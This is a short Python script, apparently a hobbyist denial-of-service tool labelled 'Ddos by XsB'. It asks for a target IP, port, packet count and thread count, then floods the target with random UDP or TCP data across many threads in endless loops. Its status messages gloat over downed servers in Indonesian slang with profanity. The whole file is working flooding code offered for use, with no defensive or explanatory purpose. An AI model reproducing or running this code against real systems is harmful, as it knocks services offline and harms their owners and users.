#!/usr/bin/env python3
#BilekAmat
#Ddos by XsB
import random
import socket
import threading
import os

os.system("clear")
print("DDoS by XsB")
ip = str(input(" DdosAttackByXsB | Ip:"))
port = int(input(" DdosAttackByXsB | Port:"))
choice = str(input(" DdosAttackByXsB | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByXsB | Packets:"))
threads = int(input(" DdosAttackByXsB | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | XsB |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XsB nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()